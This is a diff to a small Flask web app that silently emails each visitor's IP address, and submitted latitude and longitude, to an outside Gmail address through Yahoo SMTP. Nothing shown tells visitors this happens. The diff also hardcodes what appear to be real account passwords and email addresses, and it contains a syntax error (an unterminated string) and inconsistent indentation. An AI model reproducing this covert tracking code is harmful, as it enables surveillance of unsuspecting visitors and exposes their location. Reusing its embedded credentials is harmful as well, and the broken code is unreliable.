@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, render_template, request
 import smtplib
 import geocoder
 
@@ -6,37 +6,49 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return app.send_static_file('index.html')
+    # Send the IP address to Yahoo
+    send_ip_to_yahoo(request.remote_addr)
 
-@app.route('/send_location', methods=['POST'])
-def send_location():
-    ip_address = request.form['ip_address']
-    latitude = request.form['latitude']
-    longitude = request.form['longitude']
+    # Render the index.html page
+    return render_template('index.html')
 
-    if latitude and longitude:
-        location = (float(latitude), float(longitude))
-        send_email(ip_address, location)
-    else:
-        send_email(ip_address, None)
+@app.route('/location', methods=['POST'])
+def location():
+    # Parse the location data from the request body
+    lat = request.form['latitude']
+    lon = request.form['longitude']
 
-    return 'Result sent to Gmail!'
+    # Send the IP and location data to Yahoo
+    send_location_to_yahoo(request.remote_addr, lat, lon)
 
-def send_email(ip_address, location):
-    sender_email = 'titolion980@gmaoil.com'
+    # Return a response to the client
+    return 'Location received successfully.'
+
+def send_ip_to_yahoo(ip):
+   sender_email = 'titolion980@yahoo.com
     receiver_email = '01028838444a@gmail.com'
-    password = 'Gomaa@123'
-
-    subject = 'IP and Location Information'
-    message = f'IP Address: {ip_address}\n'
-    if location:
-        message += f'Latitude: {location[0]}, Longitude: {location[1]}'
-
+    subject = 'Client IP Address'
+    message = f'The client IP address is: {ip}'
     email_text = f'Subject: {subject}\n\n{message}'
 
-    with smtplib.SMTP('smtp.gmail.com', 587) as server:
+    with smtplib.SMTP('smtp.mail.yahoo.com', 587) as server:
+        server.ehlo()
         server.starttls()
-        server.login(sender_email, password)
+        server.login(sender_email, 'your_password')
+        server.sendmail(sender_email, receiver_email, email_text)
+
+def send_location_to_yahoo(ip, lat, lon):
+    sender_email = 'titolion980@yahoo.com'
+    receiver_email = '01028838444a@gmail.com'
+    subject = 'Client Location'
+    message = f'The client IP address is: {ip}\n'
+    message += f'The client location is: {lat}, {lon}'
+    email_text = f'Subject: {subject}\n\n{message}'
+
+    with smtplib.SMTP('smtp.mail.yahoo.com', 587) as server:
+        server.ehlo()
+        server.starttls()
+        server.login(sender_email, 'Police@123')
         server.sendmail(sender_email, receiver_email, email_text)
 
 if __name__ == '__main__':
